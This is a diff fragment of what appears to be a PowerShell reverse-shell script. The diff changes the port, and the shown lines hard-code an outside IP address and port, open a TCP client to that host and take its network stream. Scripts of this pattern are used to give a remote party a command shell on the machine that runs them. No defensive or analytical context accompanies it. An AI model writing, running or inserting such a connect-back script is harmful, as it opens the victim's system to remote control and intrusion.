@@ -4,7 +4,7 @@ if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 
 $address = '65.0.50.125'
-$port = '22698'
+$port = '22629'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
